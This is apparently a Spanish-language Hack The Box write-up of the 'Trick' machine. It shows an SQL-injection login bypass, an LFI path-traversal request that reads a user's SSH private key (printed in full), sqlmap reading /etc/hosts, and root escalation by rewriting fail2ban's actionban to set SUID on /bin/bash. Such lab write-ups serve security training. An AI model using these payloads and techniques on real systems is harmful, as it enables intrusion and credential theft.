---
tags:
title: Trick - Easy (HTB)
permalink: /Trick-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,25,53,80 10.10.11.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 16:01 -03
Nmap scan report for 10.10.11.166
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.88 seconds
```

# Service enumeration

### HTTP - Port 80

Vemos una web por el peurto `80`.

![{03C59263-6BD8-495E-88EA-AFFFF0412DA0}](images/{03C59263-6BD8-495E-88EA-AFFFF0412DA0}.png)

Sin embargo si buscamos funcionalidades en la pagina no encontramos nada de nada.

### Feroxbuster enumeration.

```bash
feroxbuster -u http://10.10.11.166                                                                                    
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.11.166/
 üö©  In-Scope Url          ‚îÇ 10.10.11.166
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      185c http://10.10.11.166/js => http://10.10.11.166/js/
301      GET        7l       12w      185c http://10.10.11.166/css => http://10.10.11.166/css/
200      GET        7l       36w      321c http://10.10.11.166/js/scripts.js
301      GET        7l       12w      185c http://10.10.11.166/assets => http://10.10.11.166/assets/
200      GET        8l       29w    28898c http://10.10.11.166/assets/favicon.ico
301      GET        7l       12w      185c http://10.10.11.166/assets/img => http://10.10.11.166/assets/img/
403      GET        7l       10w      169c http://10.10.11.166/assets/
200      GET    11431l    21730w   209654c http://10.10.11.166/css/styles.css
200      GET       83l      475w     5480c http://10.10.11.166/
[####################] - 2m    150010/150010  0s      found:9       errors:0      
[####################] - 2m     30000/30000   228/s   http://10.10.11.166/ 
[####################] - 2m     30000/30000   234/s   http://10.10.11.166/js/ 
[####################] - 2m     30000/30000   234/s   http://10.10.11.166/css/ 
[####################] - 2m     30000/30000   235/s   http://10.10.11.166/assets/ 
[####################] - 2m     30000/30000   234/s   http://10.10.11.166/assets/img/ 
```

No encontramos directorios ni nada, mucho menos subdominios con la herramienta `gobuster` o `wfuzz`.

### DNS - Port 53

Tratando de enumerar todos los registros con `dig`, veo un subdominio `root`.

```bash
dig any @10.10.11.166 trick.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> any @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10745
;; flags: qr aa rd; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: a9968726073a1c5de55d474468f14c4b9bdc75cdc216fea5 (good)
;; QUESTION SECTION:
;trick.htb.                     IN      ANY

;; ANSWER SECTION:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 903 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Thu Oct 16 16:49:34 -03 2025
;; MSG SIZE  rcvd: 209


                                                                                                                                    ping root.trick.htb                                    
PING trick.htb (10.10.11.166) 56(84) bytes of data.
64 bytes from trick.htb (10.10.11.166): icmp_seq=1 ttl=63 time=321 ms
64 bytes from trick.htb (10.10.11.166): icmp_seq=2 ttl=63 time=238 ms
^C
--- trick.htb ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 238.468/279.627/320.786/41.159 ms
                                                                                                                                                                                           

```

#### AXFR Transfer - Port 53 

Luego tratando una enumeracion mas avanzada intente solicitar una copia de todos los resgistros del dominio `trick.htb`, con el proposito de buscar una posible trasnferencia de zona.

>Los servidores `DNS` no deber√≠an permitir transferencias de zona (`AXFR`) a cualquier persona, ya que revela la estructura completa del dominio. Si est√° mal configurado, es una gran ganancia para la enumeraci√≥n.

Es por ende que la siguente consulta me revelo un nuevo subdominio, que claramente, no estaba en el diccionario de subdominios.

```bash
dig axfr @10.10.11.166 trick.htb

  

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @10.10.11.166 trick.htb

; (1 server found)

;; global options: +cmd

trick.htb.¬† ¬† ¬† ¬† ¬† ¬† ¬† 604800¬† IN¬† ¬† ¬† SOA¬† ¬† ¬†trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

trick.htb.¬† ¬† ¬† ¬† ¬† ¬† ¬† 604800¬† IN¬† ¬† ¬† NS¬† ¬† ¬† trick.htb.

trick.htb.¬† ¬† ¬† ¬† ¬† ¬† ¬† 604800¬† IN¬† ¬† ¬† A¬† ¬† ¬† ¬†127.0.0.1

trick.htb.¬† ¬† ¬† ¬† ¬† ¬† ¬† 604800¬† IN¬† ¬† ¬† AAAA¬† ¬† ::1

preprod-payroll.trick.htb. 604800 IN¬† ¬† CNAME¬† ¬†trick.htb.

trick.htb.¬† ¬† ¬† ¬† ¬† ¬† ¬† 604800¬† IN¬† ¬† ¬† SOA¬† ¬† ¬†trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

;; Query time: 823 msec

;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)

;; WHEN: Thu Oct 16 16:57:23 -03 2025

;; XFR size: 6 records (messages 1, bytes 231)
```

Revelando asi el subdominio `preprod-payroll.trick.htb`. Veamos que respuesta tiene el mismo en la web.

![{252C7FA5-6771-49D6-8CF4-540088A6BB76}](images/{252C7FA5-6771-49D6-8CF4-540088A6BB76}.png)

Vemos un panel de login dentro del mismo.

```bash
 gobuster dir -u http://preprod-payroll.trick.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx,aspx,php,txt,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://preprod-payroll.trick.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,zip,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home.php             (Status: 200) [Size: 486]
/index.php            (Status: 302) [Size: 9546] [--> login.php]
/login.php            (Status: 200) [Size: 5571]
/header.php           (Status: 200) [Size: 2548]
/users.php            (Status: 200) [Size: 2197]
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/ajax.php             (Status: 200) [Size: 0]
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
/readme.txt           (Status: 200) [Size: 149]
/navbar.php           (Status: 200) [Size: 1382]
/department.php       (Status: 200) [Size: 4844]
/topbar.php           (Status: 200) [Size: 585]
/position.php         (Status: 200) [Size: 5549]
/employee.php         (Status: 200) [Size: 2717]
/payroll.php          (Status: 200) [Size: 3142]
```

Intentamos una simple inyeccion `Sql` para intentar bypassear el panel de login usando el siguiente payload.

```sql
' or 1=1-- -
```

Y vemos que logramos bypassear el login, y loguearnos como `administrator`.

![{6E79CB7D-4954-4E91-B784-C0A27EA52D25}](images/{6E79CB7D-4954-4E91-B784-C0A27EA52D25}.png)

Si nos dirigimos a la seccion de `users`, vemos que hay un usuario llamado `Enemigosss` y la password no esta en texto claro, pero desde la consola si la podemos visualizar.

![{04E56810-F540-443D-ACB9-5846C10410FF}](images/{04E56810-F540-443D-ACB9-5846C10410FF}.png)

`Enemgios:SuperGucciRainbowCake`

Como estas credenciales son invalidas para conectarnos por `ssh`, podemos intentar fuzzear por directorios o como sabemos la nomenclatura
## Shell as michael

```bash
wfuzz -c -t 200 -H 'Host: preprod-FUZZ.trick.htb' -u http://trick.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw=475
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trick.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"
```

Intentando fuzzear por mas subdominio seguidos de la palabra `preprod-` conseguimos otro subdominio. Lo agregamos al `/etc/hosts` y vamos a inspeccionar su contenido.

![{FACE4402-E95E-4901-A2AD-508BF212EC5C}](images/{FACE4402-E95E-4901-A2AD-508BF212EC5C}.png)

Vemos que la web es vulnerable a un `Path Traversal` y chain con un `LFI`, y como vemos que hay un usuario michael y ademas el puerto `22`, esta abierto, podemos tratar de leer la clave privada `(id_rsa)`
![{D5AFDE6C-1B89-4FE6-97D5-60683DEE82CB}](images/{D5AFDE6C-1B89-4FE6-97D5-60683DEE82CB}.png)

En mi caso voy a usar `curl`, para ver el output de mejor manera.

```bash
‚îÄ‚îÄ(root„âøzsln)-[/home/‚Ä¶/Desktop/zsln/htb/trick]
‚îî‚îÄ# curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Una vez tenemos la clave de `michael`, la ponemos en un archivo llamado `id_rsa` y la usamos como clave de identidad para loguearnos por `ssh`.

## Shell as root

```bash
ssh -i id_rsa michael@10.10.11.166
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

Viendo en que archivos tenemos permisos sudo para ejecucion vemos lo siguiente.

```bash
Matching Defaults entries for michael on trick:                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                 
                                                                                                                                                                                           
User michael may run the following commands on trick:                                                                                                                                      
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

>**Fail2ban** es una aplicaci√≥n de software dise√±ada para la **prevenci√≥n de intrusiones** en sistemas operativos, especialmente en servidores Linux.
   Su funci√≥n principal es proteger los servicios de red de un sistema (como SSH, FTP, o servidores web) contra **ataques de fuerza bruta** y otros intentos de acceso no deseado.

El  archivo de configuracion para este se localiza en `/etc/init.d` bajo el nombre de `jail.conf`.

```bash
cat jail.conf 


[DEFAULT]

#
# MISCELLANEOUS OPTIONS
#
<SNIP>


ignorecommand =

# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5


# <SNIP>
banaction = iptables-multiport
banaction_allports = iptables-allports


```

Vemos que cuando un usuario intenta mas de `5` loguearse en la maquina se efectua un ban que dura `10` segundos y la accion a realizarse se define en el archivo `/etc/fail2ban/action.d/iptable-multiport.conf`.

```bash
cat iptables-multiport.conf
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

Vemos que la accion a realizarse esta declara en la variable `actionban`. Por lo que se me occure editar el contenido de la variable con un comando com por ejemplo :

```bash
chmod u+s /bin/bash
```

Para que al reiniciar el servicio, desde otra consola poder intentar logueos fallidos y se dispare esta accion.

Pasemos a modificar el archivo.

```bash
echo "test" > /etc/fail2ban/action.d/iptables-multiport.conf
-bash: /etc/fail2ban/action.d/iptables-multiport.conf: Permission denied
```

Veo que por mas que forme parte del grupo que controla este directorio (`security`), no puedo modificar el archivo, por lo que se me ocurre copiar el mismo en otro archivo que voy a crear y despues borrar el archivo original para despues colocar el editado en la posicion del original.

Primero copiamos el archivo en otra localizacion.

```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf ~/test.conf
```

Ahora modificamos el contenido de la variables a la mencionada anteriormente.

```bash
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod u+s /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

Y ahora borramos el original, para despues reemplazar el falso en su lugar.

```bash
rm /etc/fail2ban/action.d/iptables-multiport.conf
rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y
```

Y ahora copiamos.

```bash
cp ~/test.conf /etc/fail2ban/action.d/iptables-multiport.conf
```

Una vez hecho esto ejecutamos el `fiail2ban` como root.

```bash
sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Una ve hecho esto podemos usar `hydra` o `medusa`, para enviar logs fallidos a la `ip` victima, pero primero chequeemos los privilegios de la `bash`.

```bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Y ahora corremos `hydra`.

```bash
hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 21:19:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.11.166:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Y ahora podemos verificar que se haya ejecutado nuestro archivo, cambiandole asi los privilegios a la `bash`.

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Y como vemos efectivamente se ejecuto nuestro plan, solo queda establecer una bash como `root` y visualizar la flag de altos privilegios.

```bash
michael@trick:/etc/fail2ban$ bash -p
bash-5.0# whoami
root
```

```bash
cat /root/root.txt 
7f9e4c6fb36ed2f22ad20e5744b7e465
```

`~Happy Hacking.`


```bash
sqlmap -r login.txt --threads 10 --batch --file-read=/etc/hosts                      
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:46:19 /2025-10-16/

[21:46:19] [INFO] parsing HTTP request from 'login.txt'
[21:46:19] [INFO] resuming back-end DBMS 'mysql' 
[21:46:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1212 FROM (SELECT(SLEEP(5)))WwTh) AND 'czTg'='czTg&password=test
---
[21:46:21] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:46:21] [INFO] fingerprinting the back-end DBMS operating system
[21:46:21] [INFO] the back-end DBMS operating system is Linux
[21:46:21] [INFO] fetching file: '/etc/hosts'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[21:46:21] [INFO] resumed: 3132372E302E302E31206C6F63616C686F73740A3132372E302E312E3120747269636B0A
do you want confirmation that the remote file '/etc/hosts' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[21:46:21] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                            
[21:46:58] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
36
[21:47:37] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts' and the remote file '/etc/hosts' have the same size (36 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts (same file)

[21:47:37] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 21:47:37 /2025-10-16/

                                                                                                                                                                                           
‚îå‚îÄ‚îÄ(root„âøzsln)-[/home/‚Ä¶/Desktop/zsln/htb/trick]
‚îî‚îÄ# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hosts
127.0.0.1 localhost
127.0.1.1 trick

```

```nginx
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	server_name trick.htb;
	root /var/www/html;

	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}

	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/php7.3-fpm.sock;
	}
}


server {
	listen 80;
	listen [::]:80;

	server_name preprod-marketing.trick.htb;

	root /var/www/market;
	index index.php;

	location / {
		try_files $uri $uri/ =404;
	}

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```